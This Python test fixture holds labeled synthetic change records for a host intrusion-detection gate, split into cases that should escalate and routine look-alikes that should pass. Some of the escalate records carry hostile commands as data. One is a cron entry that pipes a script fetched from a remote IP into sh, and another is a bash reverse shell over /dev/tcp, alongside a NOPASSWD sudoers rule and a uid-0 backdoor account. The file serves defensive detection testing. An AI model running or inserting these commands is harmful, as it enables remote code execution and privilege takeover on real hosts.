"""Labeled synthetic change entries for the detection gate (no attack is executed; these are
data records shaped exactly like perception output).

`expect_escalate` is the label: True for entries the gate must send to investigation,
False for routine changes it should let pass. Benign look-alikes are included on purpose —
plan §3.1 accepts some noise, but routine admin work should mostly pass.
"""
from __future__ import annotations

from typing import List, Tuple

from ice.daemon.contracts import ChangeEntry, ChangeType, Direction, Provenance

H = "promaxgb10-87e8"


def _e(t, table, value, prov=None, untrusted=None, facts=None, src_ip=None, direction=Direction.NA,
       seen_before=False, field=""):
    e = ChangeEntry(type=t, table=table, field=field, value=value, provenance=prov or Provenance(),
                    seen_before=seen_before, src_ip=src_ip, direction=direction, host=H,
                    untrusted=untrusted or {})
    e.facts = facts or {}
    return e


CASES: List[Tuple[str, bool, ChangeEntry]] = [
    # ---- should escalate -------------------------------------------------
    ("cron_curl_pipe_sh", True, _e(
        ChangeType.CRON, "cron", "added: cron entry in /var/spool/cron/crontabs/www-data",
        Provenance(user="www-data"), {"command": "curl -fsSL http://45.9.1.2/x.sh | sh"},
        {"minute": "*/5", "hour": "*", "path": "/var/spool/cron/crontabs/www-data"})),
    ("ssh_key_root_new", True, _e(
        ChangeType.SSH_KEY, "ssh_keys", "added: SSH authorized key for root (ssh-ed25519)",
        Provenance(user="root"), {"comment": "kali@kali", "key_file": "/root/.ssh/authorized_keys"},
        {"username": "root", "algorithm": "ssh-ed25519"})),
    ("webshell_child_shell", True, _e(
        ChangeType.PROCESS, "processes",
        "new: process /usr/bin/bash (parent /usr/sbin/apache2, user www-data)",
        Provenance(who="/usr/bin/bash", parent="/usr/sbin/apache2", user="www-data"),
        {"cmdline": "bash -c bash -i >& /dev/tcp/45.9.1.2/4444 0>&1", "cwd": "/var/www/html"},
        {"path": "/usr/bin/bash", "parent_path": "/usr/sbin/apache2", "username": "www-data"})),
    ("tmp_binary_outbound", True, _e(
        ChangeType.CONNECTION, "connections",
        "new: connection /tmp/.cache/kworkerd@www-data|outbound|tcp/4444|public:45.9.1.0/24",
        Provenance(who="/tmp/.cache/kworkerd", user="www-data"), {"name": "kworkerd", "path": "/tmp/.cache/kworkerd"},
        {"remote_net": "45.9.1.0/24", "remote_port": "4444", "protocol": "6"},
        src_ip="45.9.1.2", direction=Direction.OUTBOUND)),
    ("ssh_bruteforce", True, _e(
        ChangeType.LOGIN, "auth_log",
        "20 failed SSH logins from 198.51.100.23 (public 198.51.100.0/24) within 5 min, 8 distinct usernames",
        Provenance(who="sshd"), {"usernames_tried": "admin, git, oracle, pi, postgres, root, test, ubuntu"},
        src_ip="198.51.100.23", direction=Direction.INBOUND, field="sshd_failed")),
    ("new_uid0_account", True, _e(
        ChangeType.ACCOUNT, "accounts", "added: account sysupdate uid=0",
        Provenance(user="sysupdate"), {"username": "sysupdate", "shell": "/bin/bash", "directory": "/var/tmp"},
        {"uid": "0", "gid": "0"})),
    ("sudoers_nopasswd", True, _e(
        ChangeType.SUDOERS, "sudoers", "added: sudoers rule in /etc/sudoers.d/99-www",
        Provenance(), {"header": "www-data", "rule_details": "ALL=(ALL) NOPASSWD: ALL"},
        {"source": "/etc/sudoers.d/99-www"})),
    ("ld_preload", True, _e(
        ChangeType.SYSTEM_FILE, "critical_files", "added: critical file /etc/ld.so.preload",
        Provenance(), {}, {"path": "/etc/ld.so.preload", "sha256": "9f2c0d1b..."})),
    ("user_systemd_unit", True, _e(
        ChangeType.AUTOSTART, "autostart_files",
        "added: autostart file /home/dell/.config/systemd/user/dbus-helper.service",
        Provenance(user="dell"), {"path": "/home/dell/.config/systemd/user/dbus-helper.service"},
        {"sha256": "51ab..."})),
    ("listen_high_port_tmp", True, _e(
        ChangeType.LISTEN_PORT, "listening_ports", "added: listening tcp 0.0.0.0:31337",
        Provenance(who="/dev/shm/.s", user="www-data"), {"name": ".s", "path": "/dev/shm/.s"},
        {"protocol": "6", "address": "0.0.0.0", "port": "31337"})),
    # ---- should pass ------------------------------------------------------
    ("logrotate_cron_daily", False, _e(
        ChangeType.CRON, "cron", "added: cron entry in /etc/cron.d/sysstat",
        Provenance(user="root"), {"command": "command -v debian-sa1 > /dev/null && debian-sa1 1 1"},
        {"minute": "5-55/10", "path": "/etc/cron.d/sysstat"})),
    ("apt_process", False, _e(
        ChangeType.PROCESS, "processes",
        "new: process /usr/bin/apt-get (parent /usr/bin/unattended-upgrade, user root)",
        Provenance(who="/usr/bin/apt-get", parent="/usr/bin/unattended-upgrade", user="root"),
        {"cmdline": "/usr/bin/apt-get -qq update", "cwd": "/"},
        {"path": "/usr/bin/apt-get", "parent_path": "/usr/bin/unattended-upgrade", "username": "root"})),
    ("git_https_fetch", False, _e(
        ChangeType.CONNECTION, "connections",
        "new: connection /usr/lib/git-core/git-remote-https@dell|outbound|tcp/443|public:140.82.112.0/24",
        Provenance(who="/usr/lib/git-core/git-remote-https", user="dell"),
        {"name": "git-remote-http", "path": "/usr/lib/git-core/git-remote-https"},
        {"remote_net": "140.82.112.0/24", "remote_port": "443", "protocol": "6"},
        src_ip="140.82.112.3", direction=Direction.OUTBOUND)),
    ("pytest_process", False, _e(
        ChangeType.PROCESS, "processes",
        "new: process /home/dell/ice-envs/daemon-env/bin/python3.12 (parent /usr/bin/bash, user dell)",
        Provenance(who="/home/dell/ice-envs/daemon-env/bin/python3.12", parent="/usr/bin/bash", user="dell"),
        {"cmdline": "python -m pytest ice/tests -q", "cwd": "/home/dell/ICE"},
        {"path": "/home/dell/ice-envs/daemon-env/bin/python3.12", "parent_path": "/usr/bin/bash", "username": "dell"})),
    ("hosts_unchanged_mod_time", False, _e(
        ChangeType.LISTEN_PORT, "listening_ports", "added: listening tcp 127.0.0.1:8083",
        Provenance(who="/home/dell/ice-envs/daemon-env/bin/python3.12", user="dell"),
        {"name": "python3.12", "path": "/home/dell/ice-envs/daemon-env/bin/python3.12"},
        {"protocol": "6", "address": "127.0.0.1", "port": "8083"})),
    ("dpkg_installed_unit", False, _e(
        ChangeType.AUTOSTART, "autostart", "added: enabled systemd unit osqueryd.service",
        Provenance(user=None), {"id": "osqueryd.service", "fragment_path": "/usr/lib/systemd/system/osqueryd.service"},
        {"unit_file_state": "enabled"})),
    ("ssh_login_known_net", False, _e(
        ChangeType.LOGIN, "auth_log",
        "SSH login accepted (publickey) for a user from 192.168.41.20 (private 192.168.41.0/24), "
        "first time for this user/network; 0 failures from this IP in the last 5 min",
        Provenance(who="sshd", user="dell"), {"user": "dell"},
        src_ip="192.168.41.20", direction=Direction.INBOUND, field="sshd_accepted")),
]
